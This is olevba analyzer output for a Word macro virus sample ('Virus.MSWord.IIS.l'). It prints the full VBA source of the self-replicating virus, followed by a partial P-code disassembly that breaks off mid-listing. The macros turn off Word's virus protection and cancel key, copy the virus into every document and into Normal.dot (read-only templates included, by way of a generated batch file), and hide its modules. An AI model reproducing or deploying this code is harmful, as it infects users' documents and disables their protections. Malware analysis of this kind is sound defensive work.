olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.IIS.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.IIS.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: ./Virus.MSWord.IIS.l - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'On Error GoTo eb
'MyName=SuperIISv1.4
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
windir = Environ("windir")
look = Dir("c:\temp2.dat")
If look <> "" Then
ReDim m(2)
Set m(1) = ActiveDocument.VBProject
Set m(2) = NormalTemplate.VBProject
Close
Open "c:\temp2.dat" For Input As #1
Line Input #1, mood
If mood = "n" Then
windir = Environ("windir")
Set mood = m(2)
Else
Set mood = m(1)
End If
mood.VBComponents.Import windir & "\System\Flitnic.drv"
Exit Sub
End If
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
NoSet:
windir = Environ("windir")
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
actdoche.VBComponents(t).codemodule.deletelines 1, actdoche.VBComponents.Item(t).codemodule.countoflines
actdoche.VBComponents.Remove actdoche.VBComponents(t)
ActiveDocument.Saved = True
NoDoc:
ms = nmtmpl.VBComponents.Count
For t2 = 2 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
nmtmpl.VBComponents(t2).codemodule.deletelines 1, nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents.Remove nmtmpl.VBComponents(t2)
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
'Save ActiveDocument:
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).codemodule.countoflines
FullCodeN = FullCodeN & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
FullCodeD = FullCodeD & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
End If
'Clean Activedocument:
a = actdoche.VBComponents(t).codemodule.countoflines
actdoche.VBComponents(t).codemodule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
l = ""
'Save NormalTemplate:
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).codemodule.countoflines
FullCodeD = FullCodeD & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
FullCodeN = FullCodeN & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents(t2).codemodule.deletelines 1, a
NormalTemplate.Saved = True
esub:
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
'If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormAt = False
Close #1
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).codemodule.countoflines
If a < 1 Then
innt = 1
i = 20
Exit For
End If
Next inn
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).codemodule.countoflines
If a < 1 Then
iact = 1
i = 20
Exit For
End If
Next inn2
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
If innt = 1 Or iact = 1 Then
If innt = 1 Then
Set inff = NormalTemplate.VBProject
component = inn
FullCode = FullCodeN
InstSys = 1
Else
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
End If
onceAgain:
inff.VBComponents(component).codemodule.addfromstring (FullCode)
If iact = 1 Then
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
iact = 0
GoTo onceAgain
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents(t2).codemodule.deletelines 1, al
Next i
End If
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
opttt.VirusProtection = False
opttt.ConfirmConversions = False
opttt.SaveNormalPrompt = False
Close #1
windir = Environ("windir")
On Error GoTo NoInf
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
l = ""
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).codemodule.countoflines
FullCodeN = FullCodeN & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
End If
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).codemodule.countoflines
FullCodeD = FullCodeD & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
End If
If NormT <> 1 Then
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).codemodule.countoflines
If a < 1 Then
innt = 1
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
InsertC = "n"
mmm = Dir("c:\temp2.dat")
If mmm <> "" Then Kill "c:\temp2.dat"
Close
Open "c:\temp2.dat" For Append As #1
Print #1, InsertC
Close
Call ViewVbCode
Close
Kill "c:\temp2.dat"
GoTo look
End If
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).codemodule.countoflines
If a < 1 Then
iact = 1
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
InsertC = "nn"
mmm = Dir("c:\temp2.dat")
If mmm <> "" Then Kill "c:\temp2.dat"
Close
Open "c:\temp2.dat" For Append As #1
Print #1, InsertC
Close
Call ViewVbCode
Close
Kill "c:\temp2.dat"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
If innt = 1 Or iact = 1 Then
If innt = 1 Then
Set inff = NormalTemplate.VBProject
component = inn
FullCode = FullCodeN
InstSys = 1
Else
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
End If
inff.VBComponents(component).codemodule.addfromstring (FullCode)
If InstSys = 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
For i = 1 To 500
Print #1, "rem Flitnic has cought you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y " & Chr(34) & "c:\Troop.dat" & Chr(34) & " " & Chr(34) & NormalTemplate.FullName & Chr(34)
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
End If
notemp:
End If
End If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo NoNormal
End If
If NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved = True
'The only real- stealth virus till 08. april 1999. Infects Normal.Dot when
'it's ReadOnly too (immediatly, the first time you load an infected
'Document
'Written by Flitnic, member of [S o S] No Payload included yet!
NoNormal:
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.IIS.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 18331 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0010 "On Error GoTo eb"
' Line #2:
' 	QuoteRem 0x0000 0x0013 "MyName=SuperIISv1.4"
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #4:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #6:
' 	Label NoSet 
' Line #7:
' 	ArgsCall (Call) Flitnic 0x0000 
' Line #8:
' 	Label eb 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub ViewVbCode())
' Line #11:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #12:
' 	LitStr 0x000C "c:\temp2.dat"
' 	ArgsLd Dir 0x0001 
' 	St look 
' Line #13:
' 	Ld look 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #14:
' 	OptionBase 
' 	LitDI2 0x0002 
' 	Redim m 0x0001 (As Variant)
' Line #15:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	LitDI2 0x0001 
' 	ArgsSet m 0x0001 
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	LitDI2 0x0002 
' 	ArgsSet m 0x0001 
' Line #17:
' 	CloseAll 
' Line #18:
' 	LitStr 0x000C "c:\temp2.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #19:
' 	LitDI2 0x0001 
' 	Ld mood 
' 	LineInput 
' Line #20:
' 	Ld mood 
' 	LitStr 0x0001 "n"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	ArgsLd m 0x0001 
' 	Set mood 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsLd m 0x0001 
' 	Set mood 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld mood 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #27:
' 	ExitSub 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	OnError NoDoc 
' Line #30:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #31:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #32:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #33:
' 	Label NoSet 
' Line #34:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #35:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #36:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #37:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #38:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #39:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #41:
' 	ExitFor 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #45:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #46:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #47:
' 	Label NoDoc 
' Line #48:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #49:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #50:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #51:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #52:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #54:
' 	ExitFor 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #58:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #59:
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #60:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #61:
' 	Label esub 
' Line #62:
' 	Label eb 
' Line #63:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #64:
' 	Label NoDocL 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #66:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub ToolsMacro())
' Line #69:
' 	OnError NoDoc 
' Line #70:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #71:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #72:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #73:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #74:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #75:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #76:
' 	Label NoSet 
' Line #77:
' 	QuoteRem 0x0000 0x0014 "Save ActiveDocument:"
' Line #78:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #79:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #80:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #81:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #82:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #83:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #84:
' 	ExitFor 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #89:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #90:
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #91:
' 	Ld FullCodeN 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeN 
' Line #92:
' 	Ld FullCodeD 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeD 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #95:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #97:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #98:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #99:
' 	Label NoDoc 
' Line #100:
' 	LitStr 0x0000 ""
' 	St l 
' Line #101:
' 	QuoteRem 0x0000 0x0014 "Save NormalTemplate:"
' Line #102:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #103:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #104:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ls 
' Line #105:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #106:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.4"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #108:
' 	ExitFor 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #112:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #113:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #114:
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #115:
' 	Ld FullCodeD 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeD 
' Line #116:
' 	Ld FullCodeN 
' 	LitDI2 0x0002 
' 	Ld a 
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St FullCodeN 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #119:
' 	LitStr 0x0000 ""
' 	St l 
' Line #120:
' 	OnError (GoTo 0) 
' Line #121:
' 	OnError eb 
' Line #122:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #123:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #124:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #125:
' 	Label esub 
' Line #126:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #127:
' 	Ld a 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #128:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #129:
' 	Label eb 
' Line #130:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #131:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #132:
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #133:
' 	QuoteRem 0x0000 0x003E "If Application.ShowVisualBasicEditor = True Then ReInf = False"
' Line #134:
' 	Label Reinfection 
' Line #135:
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #136:
' 	QuoteRem 0x0000 0x000C "Reinfection:"
' Line #137:
' 	LitDI2 0x0000 
' 	St Acd 
' Line #138:
' 	LitDI2 0x0000 
' 	St NormT 
' Line #139:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #140:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #142:
' 	Label look 
' Line #143:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #144:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #145:
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St a 
' Line #146:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #147:
' 	LitDI2 0x0001 
' 	St innt 
' Line #148:
' 	LitDI2 0x0014 
' 	St i 
' Line #149:
' 	ExitFor 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #153:
' 	Ld a 
